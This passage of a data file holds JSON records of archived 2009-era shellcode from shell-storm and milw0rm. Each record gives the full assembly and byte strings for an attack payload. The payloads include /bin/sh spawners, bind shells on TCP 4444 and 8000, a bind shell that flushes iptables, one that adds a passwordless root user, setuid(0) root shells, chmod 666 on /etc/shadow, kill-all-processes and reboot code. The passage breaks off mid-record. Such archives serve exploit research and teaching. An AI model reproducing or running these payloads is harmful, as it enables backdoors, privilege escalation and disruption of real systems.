\"\\x48\\x31\\xff\\xb0\\x69\\x0f\\x05\\x48\\x31\\xd2\\x48\\xbb\\xff\\x2f\\x62\"", "        \"\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\"", "        \"\\xc0\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\"", "        \"\\x58\\x0f\\x05\";", "        (*(void (*)()) shellcode)();", "}", " ", "2009-05-14", "evil.xi4oyu ", "", "// milw0rm.com [2009-05-14]"]},
{"Title": "FreeBSD/x64 - execve(/bin/sh) Shellcode (34 bytes)", "Author": "c0d3_z3r0", "Published": ": 2009-05-15", "Platform": "FreeBSD_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-104.php", "View": null, "code": [" /*", "Anderson Eduardo < c0d3_z3r0 >", "Hack'n Roll", "http://anderson.hacknroll.com", "http://blog.hacknroll.com ", " ", ".section .text", ".globl _start", "_start:", " ", "", "        xor %rcx,%rcx", "        jmp string", " ", "        main:", " ", "        popq %rsi", "        movq %rsi,%rdi", " ", "        pushq %rsi", "        pushq %rcx", "        movq %rsp,%rsi", " ", "        movq %rcx,%rdx", "        movb $0x3b,%al", "        syscall", " ", "        string:", "        callq main", "        .string \"/bin/sh\"", " ", "", "*/", " ", "int main(void)", "{", "char shellcode[] =", "\"\\x48\\x31\\xc9\"", "\"\\xeb\\x10\"", "\"\\x5e\"", "\"\\x48\\x89\\xf7\"", "\"\\x56\"", "\"\\x51\"", "\"\\x48\\x89\\xe6\"", "\"\\x48\\x89\\xca\"", "\"\\xb0\\x3b\"", "\"\\x0f\\x05\"", "\"\\x48\\xe8\\xea\\xff\\xff\\xff\"", "\"\\x2f\"", "\"\\x62\"", "\"\\x69\"", "\"\\x6e\"", "\"\\x2f\"", "\"\\x73\\x68\";", " ", "        (*(void (*)()) shellcode)();", " ", "//Hack'n Roll", " ", "return 0;", "} ", "", "// milw0rm.com [2009-05-15]"]},
{"Title": "FreeBSD/x64 - exec /bin/sh Shellcode (31 bytes)", "Author": "Hack'n Roll", "Published": ": 2009-05-18", "Platform": "FreeBSD_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-106.php", "View": null, "code": ["/** ", " *", " *   _   _            _            ____       _ _ ", " *  | | | | __ _  ___| | ___ __   |  _ \\ ___ | | |", " *  | |_| |/ _` |/ __| |/ / '_ \\  | |_) / _ \\| | |", " *  |  _  | (_| | (__|   <| | | | |  _ < (_) | | |", " *  |_| |_|\\__,_|\\___|_|\\_\\_| |_| |_| \\_\\___/|_|_|", " *           [ http://www.hacknroll.com ]", " *", " * Description:", " *    FreeBSD x86-64 exec(\"/bin/sh\") Shellcode - 31 bytes", " *", " *", " *", " * Authors:", " *    Maycon M. Vitali ( 0ut0fBound )", " *        Milw0rm .: http://www.milw0rm.com/author/869", " *        Page ....: http://maycon.hacknroll.com", " *        Email ...: maycon@hacknroll.com", " *", " *    Anderson Eduardo ( c0d3_z3r0 )", " *        Milw0rm .: http://www.milw0rm.com/author/1570", " *        Page ....: http://anderson.hacknroll.com", " *        Email ...: anderson@hacknroll.com", " * ", " * -------------------------------------------------------", " *   ", " * amd64# gcc hacknroll.c -o hacknroll", " * amd64# ./hacknroll", " * # exit", " * amd64#", " *", " * -------------------------------------------------------", " */", "", "const char shellcode[] =", "        \"\\x48\\x31\\xc0\"                               // xor    %rax,%rax", "        \"\\x99\"                                       // cltd", "        \"\\xb0\\x3b\"                                   // mov    $0x3b,%al", "        \"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"   // mov $0x68732f6e69622fff,%rdi", "        \"\\x48\\xc1\\xef\\x08\"                           // shr    $0x8,%rdi", "        \"\\x57\"                                       // push   %rdi", "        \"\\x48\\x89\\xe7\"                               // mov    %rsp,%rdi", "        \"\\x57\"                                       // push   %rdi", "        \"\\x52\"                                       // push   %rdx", "        \"\\x48\\x89\\xe6\"                               // mov    %rsp,%rsi", "        \"\\x0f\\x05\";                                  // syscall", "", "int main(void)", "{", "        (*(void (*)()) shellcode)();", "        return 0;", "}", "", "", "// milw0rm.com [2009-05-18]"]},
{"Title": "Linux/x64 - Bind (4444/TCP) Shell Shellcode (132 bytes)", "Author": "evil.xi4oyu", "Published": ": 2009-05-18", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-78.php", "View": null, "code": ["/*", "linux/x86-64  bindshell(port 4444)", "xi4oyu [at] 80sec.com", "http://www.80sec.com", " ", " ", "BITS 64", "xor eax,eax", "xor ebx,ebx", "xor edx,edx", ";socket", "mov al,0x1", "mov esi,eax", "inc al", "mov edi,eax", "mov dl,0x6", "mov al,0x29", "syscall", "xchg ebx,eax ;store the server sock", ";bind", "xor  rax,rax", "push   rax", "push 0x5c110102", "mov  [rsp+1],al", "mov  rsi,rsp", "mov  dl,0x10", "mov  edi,ebx", "mov  al,0x31", "syscall", ";listen", "mov  al,0x5", "mov esi,eax", "mov  edi,ebx", "mov  al,0x32", "syscall", ";accept", "xor edx,edx", "xor esi,esi", "mov edi,ebx", "mov al,0x2b", "syscall", "mov edi,eax ; store sock", ";dup2", "xor rax,rax", "mov esi,eax", "mov al,0x21", "syscall", "inc al", "mov esi,eax", "mov al,0x21", "syscall", "inc al", "mov esi,eax", "mov al,0x21", "syscall", ";exec", "xor rdx,rdx", "mov rbx,0x68732f6e69622fff", "shr rbx,0x8", "push rbx", "mov rdi,rsp", "xor rax,rax", "push rax", "push rdi", "mov  rsi,rsp", "mov al,0x3b", "syscall", "push rax", "pop  rdi", "mov al,0x3c", "syscall", "*/", " ", "main() {", "        char shellcode[] =", "        \"\\x31\\xc0\\x31\\xdb\\x31\\xd2\\xb0\\x01\\x89\\xc6\\xfe\\xc0\\x89\\xc7\\xb2\"", "        \"\\x06\\xb0\\x29\\x0f\\x05\\x93\\x48\\x31\\xc0\\x50\\x68\\x02\\x01\\x11\\x5c\"", "        \"\\x88\\x44\\x24\\x01\\x48\\x89\\xe6\\xb2\\x10\\x89\\xdf\\xb0\\x31\\x0f\\x05\"", "        \"\\xb0\\x05\\x89\\xc6\\x89\\xdf\\xb0\\x32\\x0f\\x05\\x31\\xd2\\x31\\xf6\\x89\"", "        \"\\xdf\\xb0\\x2b\\x0f\\x05\\x89\\xc7\\x48\\x31\\xc0\\x89\\xc6\\xb0\\x21\\x0f\"", "        \"\\x05\\xfe\\xc0\\x89\\xc6\\xb0\\x21\\x0f\\x05\\xfe\\xc0\\x89\\xc6\\xb0\\x21\"", "        \"\\x0f\\x05\\x48\\x31\\xd2\\x48\\xbb\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"", "        \"\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\"", "        \"\\xe6\\xb0\\x3b\\x0f\\x05\\x50\\x5f\\xb0\\x3c\\x0f\\x05\";", "        ", "        (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2009-05-18]"]},
{"Title": "Linux/x86 - sethostname(PwNeD !!, 8) Shellcode (32 bytes)", "Author": "gunslinger_", "Published": ": 2009-05-31", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-622.php", "View": null, "code": ["/*", "Title  : sethostname \"pwned !!\"", "Name   : 32 bytes sys_sethostname(\"PwNeD !!\",8) x86 linux shellcode", "Date   : may, 31 2009", "Author : gunslinger_ <yudha.gunslinger[at]gmail.com>", "Web    : devilzc0de.com", "blog   : gunslingerc0de.wordpress.com", "tested on : linux debian", "*/", "", "#include <stdio.h>", "", "char *shellcode=", " \"\\xeb\\x11\"                    /* jmp    0x8048073 */", " \"\\x31\\xc0\"                    /* xor    %eax,%eax */", " \"\\xb0\\x4a\"                    /* mov    $0x4a,%al */", " \"\\x5b\"                        /* pop    %ebx */", " \"\\xb1\\x08\"                    /* mov    $0x8,%cl */", " \"\\xcd\\x80\"                    /* int    $0x80 */", " \"\\x31\\xc0\"                    /* xor    %eax,%eax */", " \"\\xb0\\x01\"                    /* mov    $0x1,%al */", " \"\\x31\\xdb\"                    /* xor    %ebx,%ebx */", " \"\\xcd\\x80\"                    /* int    $0x80 */", " \"\\xe8\\xea\\xff\\xff\\xff\"        /* call   0x8048062 */", " \"\\x50\"                        /* push   %eax */", " \"\\x77\\x4e\"                    /* ja     0x80480c9 */", " \"\\x65\"                        /* gs */", " \"\\x44\"                        /* inc    %esp */", " \"\\x20\\x21\"                    /* and    %ah,(%ecx) */", " \"\\x21\";                        /* .byte 0x21 */", "", "int main(void)", "{", "\t\tfprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "\t\t((void (*)(void)) shellcode)();", "\t\treturn 0;", "}"]},
{"Title": "Linux/x86 - Bind (8000/TCP) Shell (/bin/sh) Shellcode (179 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-06-01", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13319.s", "View": "https://old.exploit-db.com/raw/13319/", "code": [";", "; Title\t: Bind asm code Linux x86 - 179 bytes", "; IP\t: 0.0.0.0", "; Port\t: 8000", ";", ";", "; Use\t: nc localhost 8000", ";\t  id\t", ";\t  uid=0(root) gid=0(root) groupes=0(root)", ";", ";", "; Author\t: Jonathan Salwan", "; Mail\t\t: submit AT shell-storm.org", "; Web\t\t: http://www.shell-storm.org", ";", ";", "; More shellcodes in => http://www.shell-storm.org/shellcode/", ";", "", "", "section .data", "name db '/bin/sh', 0", "section .text", "global _start", "", "_start:", ";;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x0", "push\tbyte\t0x1", "push\tbyte\t0x2", "", "mov\teax, \t0x66", "mov\tebx, \t0x1", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;", "", "mov \tedx, \teax", "", ";;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x0", "push\tbyte\t0x0", "push\tbyte\t0x0", "push\tword\t0x401f", "push\tword\t0x2", "mov\tebx, \tesp", "", "push \tbyte\t0x10", "push\tebx", "push\tedx", "", "mov\teax, \t0x66", "mov\tebx, \t0x2", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;", "", ";;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x1", "push\tedx", "", "mov\teax,\t0x66", "mov\tebx,\t0x4", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;", "", ";;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x0", "push\tbyte\t0x0", "push\tedx", "", "mov\teax, \t0x66", "mov\tebx, \t0x5", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;", "", "mov\tedx, \teax", "", ";;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;", "mov\teax, \t0x3f", "mov\tebx, \tedx", "mov \tebx, \t0x2", "int\t0x80", "", "mov     eax, \t0x3f", "mov     ebx, \tedx", "mov     ecx, \t0x1", "int     0x80", "", "mov     eax, \t0x3f", "mov     ebx, \tedx", "mov     ecx, \t0x0", "int     0x80", ";;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;", "", ";;;;;;;;;;;;;;;;;;;;Execve();;;;;;;;;;;;;;;;;;;", "mov\tal, \t0x0b", "mov\tebx, \tname", "push\tbyte\t0x0", "push\tname", "mov\tecx, \tesp", "mov \tedx, \t0x0", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Execve();;;;;;;;;;;;;;;;;;;", "", "; milw0rm.com [2009-06-01]"]},
{"Title": "Linux/x86 - Bind (8000/TCP) Shell + Flush IPTables Rules (/sbin/iptables -F) Shellcode (176 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-06-08", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13317.s", "View": "https://old.exploit-db.com/raw/13317/", "code": [";", "; Title\t: Bindport TCP/8000 & execve iptables -F", "; os\t: Linux x86", "; size\t: 176 bytes", "; IP\t: localhost", "; Port\t: 8000", "; Use\t: nc localhost 8000", ";", "; Author\t: Jonathan Salwan", "; Mail\t\t: submit AT shell-storm.org", "; Web\t\t: http://www.shell-storm.org", ";", ";", "; More shellcodes in => http://www.shell-storm.org/shellcode/", ";", "", "section .text", "global _start", "", "_start:", ";;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x0", "push\tbyte\t0x1", "push\tbyte\t0x2", "", "mov\teax, \t0x66", "mov\tebx, \t0x1", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;", "", "mov \tedx, \teax", "", ";;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x0", "push\tbyte\t0x0", "push\tbyte\t0x0", "push\tword\t0x401f", "push\tword\t0x2", "mov\tebx, \tesp", "", "push \tbyte\t0x10", "push\tebx", "push\tedx", "", "mov\teax, \t0x66", "mov\tebx, \t0x2", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;", "", ";;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x1", "push\tedx", "", "mov\teax,\t0x66", "mov\tebx,\t0x4", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;", "", ";;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x0", "push\tbyte\t0x0", "push\tedx", "", "mov\teax, \t0x66", "mov\tebx, \t0x5", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;", "", "mov\tedx, \teax", "", ";;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;", "mov\teax, \t0x3f", "mov\tebx, \tedx", "mov \tebx, \t0x2", "int\t0x80", "", "mov     eax, \t0x3f", "mov     ebx, \tedx", "mov     ecx, \t0x1", "int     0x80", "", "mov     eax, \t0x3f", "mov     ebx, \tedx", "mov     ecx, \t0x0", "int     0x80", ";;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;", "", "", ";; execve(/sbin/iptables\", \"-F\", NULL)", ";; By Kris Katterjohn", "", "push \tbyte \t11", "pop \teax", "cdq", "push \tedx", "push \tword \t0x462d", "mov \tecx, \tesp", "push \tedx", "push \tword \t0x7365", "push \t0x6c626174", "push \t0x70692f6e", "push \t0x6962732f", "mov \tebx, \tesp", "push \tedx", "push \tecx", "push \tebx", "mov \tecx, \tesp", "int \t0x80", "", "; milw0rm.com [2009-06-08]"]},
{"Title": "Linux/x86 - Bind (8000/TCP) Shell + Add Root User Shellcode (225+ bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-06-08", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13318.s", "View": "https://old.exploit-db.com/raw/13318/", "code": [";", "; Title\t: Bindport TCP/8000 & execve add user with access root", "; os\t: Linux x86", "; size\t: 225+ bytes", "; IP\t: localhost", "; Port\t: 8000", "; Use\t: nc localhost 8000", ";", "; Author\t: Jonathan Salwan", "; Mail\t\t: submit AT shell-storm.org", "; Web\t\t: http://www.shell-storm.org", ";", ";", "; More shellcodes in => http://www.shell-storm.org/shellcode/", ";", "", "section .text", "global _start", "", "_start:", ";;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x0", "push\tbyte\t0x1", "push\tbyte\t0x2", "", "mov\teax, \t0x66", "mov\tebx, \t0x1", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;", "", "mov \tedx, \teax", "", ";;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x0", "push\tbyte\t0x0", "push\tbyte\t0x0", "push\tword\t0x401f", "push\tword\t0x2", "mov\tebx, \tesp", "", "push \tbyte\t0x10", "push\tebx", "push\tedx", "", "mov\teax, \t0x66", "mov\tebx, \t0x2", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;", "", ";;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x1", "push\tedx", "", "mov\teax,\t0x66", "mov\tebx,\t0x4", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;", "", ";;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;", "push\tbyte\t0x0", "push\tbyte\t0x0", "push\tedx", "", "mov\teax, \t0x66", "mov\tebx, \t0x5", "mov\tecx, \tesp", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;", "", "mov\tedx, \teax", "", ";;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;", "mov\teax, \t0x3f", "mov\tebx, \tedx", "mov \tebx, \t0x2", "int\t0x80", "", "mov     eax, \t0x3f", "mov     ebx, \tedx", "mov     ecx, \t0x1", "int     0x80", "", "mov     eax, \t0x3f", "mov     ebx, \tedx", "mov     ecx, \t0x0", "int     0x80", ";;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;", "", ";;;;;;;;;;;;;;;;;;;;Open();;;;;;;;;;;;;;;;;;;;;", "push \tbyte \t0x05", "pop \teax", "xor \tecx, \tecx", "push \tecx", "push \t0x64777373", "push \t0x61702f2f", "push \t0x6374652f", "mov \tebx, \tesp", "mov \tcx, \t02001Q", "int\t0x80", ";;;;;;;;;;;;;;;;;;;;Open();;;;;;;;;;;;;;;;;;;;;", "", "mov \tebx, \teax", "", ";;;;;;;;;;;;;;;;;;;;Write();;;;;;;;;;;;;;;;;;;;", "push \tbyte \t0x04", "pop \teax", "xor \tedx, \tedx", "push \tedx", "", "push\tword\t0x6873", "push\t0x61622f6e", "push\t0x69622f3a", "push\t0x746f6f72", "push\t0x2f3a746f", "push\t0x6f723a30", "push\t0x3a303a3a", "push\t0x74303072", "mov \tecx, \tesp", "push \tbyte 0x1f", "pop \tedx", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;Write();;;;;;;;;;;;;;;;;;;;", "", ";;;;;;;;;;;;;;;;;;;;;Close();;;;;;;;;;;;;;;;;;;", "push \tbyte \t0x06", "pop \teax", "int \t0x80", ";;;;;;;;;;;;;;;;;;;;;Close();;;;;;;;;;;;;;;;;;;", "", "push \tbyte 0x01", "pop\teax", "int \t0x80", "", "; milw0rm.com [2009-06-08]"]},
{"Title": "Linux/x86 - setreuid(geteuid(), geteuid()) + execve(\"/bin/sh\",0,0) Shellcode (34 bytes)", "Author": "blue9057", "Published": ": 2009-06-16", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-399.php", "View": null, "code": ["/*", " *", " * linux/x86 setreuid(geteuid(),geteuid()),execve(\"/bin/sh\",0,0) 34byte universal shellcode", " *", " * blue9057 root@blue9057.com", " *", " * /", "int main()", "{", "    char shellcode[]=\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\"", "                              \"\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\"", "                              \"\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\";", "    //setreuid(geteuid(),geteuid());", "    //execve(\"/bin/sh\",0,0);", "    __asm__(\"\"", "            \"push $0x31;\"", "            \"pop %eax;\"", "            \"cltd;\"", "            \"int $0x80;\"        // geteuid();", "            \"mov %eax, %ebx;\"", "            \"mov %eax, %ecx;\"", "            \"push $0x46;\"    // setreuid(geteuid(),geteuid());", "            \"pop %eax;\"", "            \"int $0x80;\"", "            \"mov $0xb, %al;\"", "            \"push %edx;\"", "            \"push $0x68732f6e;\"", "            \"push $0x69622f2f;\"", "            \"mov %esp, %ebx;\"", "            \"mov %edx, %ecx;\"", "            \"int $0x80;\"        // execve(\"/bin/sh\",0,0);", "            \"\");", "}", "", "// milw0rm.com [2009-06-16]"]},
{"Title": "NetBSD/x86 - Kill All Processes Shellcode (23 bytes)", "Author": "anonymous", "Published": ": 2009-06-18", "Platform": "NetBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-803.php", "View": null, "code": ["/*", "", "netbsd/x86 kill all processes shellcode", "author Anonymous", "", "this shellcode is using syscall number 37 or 0x25", "37      STD             { int sys_kill(int pid, int signum); }", "", "", "here is assembler code using intel syntaxe and NASM", "--------------begin-----------", "", "section .note.netbsd.ident", " \tdd\t0x07,0x04,0x01", " \tdb\t\"NetBSD\",0x00,0x00", " \tdd\t200000000", " ", " ", " section .data", "", " section .text", " \tglobal _start", " ", " _start:", "xor eax, eax", "push 0x09", "mov eax, -1", "push eax", "xor eax,eax", "mov al, 37 ", "push eax", "int 0x80", "-------------------------end------------", "", "if we dissasemble this code wi will get shellcode", "\"\\x66\\x31\\xc0\\x68\\x09\\x00\\x66\\xb8\\xff\\xff\\xff\\xff\\x66\\x50\\x66\\x31\\xc0\\xb0\\x25\\x66\\x50\\xcd\\x80\"", "*/", "", "// milw0rm.com [2009-06-18]"]}
]

const pag_9 = [{"Title": "Linux/x86 - exit(0) / exit(1) Shellcode (3/4 bytes)", "Author": "TheWorm", "Published": ": 2009-06-18", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-470.php", "View": null, "code": ["#include <stdio.h>", "", "const char shellcode[]=", "\t\"\\x40\"\t\t\t// inc\t%eax", "//\t\"\\x43\"\t\t\t// inc\t%ebx\t", "\t\"\\xcd\\x80\";\t\t// int\t$0x80", "", "int main()", "{", "\tprintf\t(\"\\n[+] Yet conditional (%eax==0) Linux/x86 exit(0) 3 bytes or", "exit(1) 4 bytes\"", "\t\t\"\\n[+] Date: 18/06/2009\"", "\t\t\"\\n[+] Author: TheWorm\"", "\t\t\"\\n\\n[+] Shellcode Size: %d bytes\\n\\n\", sizeof(shellcode)-1);", "\t(*(void (*)()) shellcode)();", "\treturn 0;", "}"]},
{"Title": "Linux/x86 - chmod 666 /etc/shadow + Polymorphic Shellcode (54 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-06-22", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13315.c", "View": "https://old.exploit-db.com/raw/13315/", "code": ["/*", "Title\t: Linux/x86 - Shellcode Polymorphic chmod(\"/etc/shadow\",666) & exit() - 54 bytes", "Encode  : _ADD", "", "Author\t: Jonathan Salwan", "Mail\t: submit [!] shell-storm.org", "", "", "! Database of shellcodes => http://www.shell-storm.org/shellcode/", "", "", "Informations  _chmod() & _exit():", "================================", "\t", "\t%eax = 15", "   \t%ebx = /etc/shadow", "   \t%ecx = 666", "", "        %eax = 1", "        %ebx = 0", "", "Disassembly of section .text:", "", " 08048054 <.text>:", " 8048054:\t51                   \tpush   %ecx", " 8048055:\t66 b9 b6 01          \tmov    $0x1b6,%cx", " 8048059:\t68 61 64 6f 77       \tpush   $0x776f6461", " 804805e:\t68 63 2f 73 68       \tpush   $0x68732f63", " 8048063:\t68 2f 2f 65 74       \tpush   $0x74652f2f", " 8048068:\t89 e3                \tmov    %esp,%ebx", " 804806a:\t6a 0f                \tpush   $0xf", " 804806c:\t58                   \tpop    %eax", " 804806d:\tcd 80                \tint    $0x80", " 804806f:\t40                   \tinc    %eax", " 8048070:\tcd 80                \tint    $0x80", "", "*/", "", "", "#include \"stdio.h\"", "", "char shellcode[] = \t\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x30\\x80\"", "\t\t\t\"\\x6c\\x0e\\xff\\x23\\x80\\xe9\\x01\\x75\"", "  \t\t\t\"\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\"", "\t\t\t\"\\x74\\x89\\xdc\\xd9\\x24\\x8b\\x84\\x87\"", "\t\t\t\"\\x92\\x9a\\x8b\\x86\\x52\\x96\\x8b\\x8b\"", "\t\t\t\"\\x52\\x52\\x88\\x97\\xac\\x06\\x8d\\x32\"", "\t\t\t\"\\x7b\\xf0\\xa3\\x63\\xf0\\xa3\";", "", "int main()", "{", "\tprintf(\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();", "\t", "\treturn 0;", "}", "", "// milw0rm.com [2009-06-22]"]},
{"Title": "Linux/x86 - setuid(0) + execve(/bin/sh,0) Shellcode (25 bytes)", "Author": "TheWorm", "Published": ": 2009-06-23", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-472.php", "View": null, "code": ["#include <stdio.h>", "", "const char shellcode[]=", "\t\"\\x6a\\x17\"\t\t// push\t$0x17", "\t\"\\x58\"\t\t\t// pop\t%eax", "\t\"\\x31\\xdb\"\t\t// xor\t%ebx,%ebx", "\t\"\\xcd\\x80\"\t\t// int\t$0x80", "", "\t\"\\xb0\\x0b\"\t\t// mov\t$0xb,%al (So you'll get segfault   if it's not able", "to do the setuid(0). If you don't want this you can write \"\\x6a\\x0b\\x58\"", "instead of \"\\xb0\\x0b\", but the shellcode will be 1 byte longer", "\t\"\\x99\"\t\t\t// cltd", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"\t// push\t$0x68732f2f", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"\t// push\t$0x6e69622f", "\t\"\\x89\\xe3\"\t\t// mov\t%esp,%ebx", "\t\"\\xcd\\x80\";\t\t// int\t$0x80", "", "int main()", "{", "\tprintf\t(\"\\n[+] Linux/x86 setuid(0) & execve(/bin/sh,0)\"", "\t\t\"\\n[+] Date: 23/06/2009\"", "\t\t\"\\n[+] Author: TheWorm\"", "\t\t\"\\n\\n[+] Shellcode Size: %d bytes\\n\\n\", sizeof(shellcode)-1);", "\t(*(void (*)()) shellcode)();", "\treturn 0;", "}"]},
{"Title": "Linux/x86 - setuid(0) + setgid(0) + execve(/bin/sh,[/bin/sh,NULL])) Shellcode (25 bytes)", "Author": "TheWorm", "Published": ": 2009-06-23", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-473.php", "View": null, "code": ["#include <stdio.h>", "", "const char shellcode[]=", "\t\"\\x6a\\x17\"\t\t// push\t$0x17", "\t\"\\x58\"\t\t\t// pop\t%eax", "\t\"\\x31\\xdb\"\t\t// xor\t%ebx,%ebx", "\t\"\\xcd\\x80\"\t\t// int\t$0x80", "", "\t\"\\xb0\\x2e\"\t\t// mov\t$0x2e,%al", "\t\"\\xcd\\x80\"\t\t// int\t$0x80", "", "\t\"\\xb0\\x0b\"\t\t// mov\t$0xb,%al (So you'll get segfault if it's not able to", "do the setuid(0). If you don't want this you can write \"\\x6a\\x0b\\x58\"", "instead of \"\\xb0\\x0b\", but the shellcode will be 1 byte longer", "\t\"\\x99\"\t\t\t// cltd", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"\t// push\t$0x68732f2f", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"\t// push\t$0x6e69622f", "\t\"\\x89\\xe3\"\t\t// mov\t%esp,%ebx", "\t\"\\x52\"\t\t\t// push\t%edx", "\t\"\\x53\"\t\t\t// push\t%ebx", "\t\"\\x89\\xe1\"\t\t// mov\t%esp,%ecx", "\t\"\\xcd\\x80\";\t\t// int\t$0x80", "", "int main()", "{", "\tprintf\t(\"\\n[+] Linux/x86 setuid(0), setgid(0) &", "execve(/bin/sh,[/bin/sh,NULL])\"", "\t\t\"\\n[+] Date: 23/06/2009\"", "\t\t\"\\n[+] Author: TheWorm\"", "\t\t\"\\n\\n[+] Shellcode Size: %d bytes\\n\\n\", sizeof(shellcode)-1);", "\t(*(void (*)()) shellcode)();", "\treturn 0;", "}"]},
{"Title": "Linux/x86 - reboot() + Polymorphic Shellcode (57 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-06-29", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13314.c", "View": "https://old.exploit-db.com/raw/13314/", "code": ["/*  ", " *  Title :\treboot() polymorphic shellcode - 57 bytes", " *  Os: \tLinux x86", " *", " *  Author: \tJonathan Salwan - submit AT shell-storm.org", " *  Web: \thttp://www.shell-storm.org", " *", " *", " *  !! Database of shellcodes => http://www.shell-storm.org/shellcode/", " *", " */", "", "#include <stdio.h>", "", "char shellcode[] = \t\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x30\\x80\"", "\t\t\t\"\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\"", "  \t\t\t\"\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\"", "\t\t\t\"\\x32\\xc1\\x51\\x69\\x63\\x70\\x70\\x75\"", "\t\t\t\"\\x69\\x6f\\x30\\x73\\x66\\x69\\x30\\x74\"", "\t\t\t\"\\x63\\x6a\\x8a\\xe4\\x51\\x8a\\xe3\\x54\"", 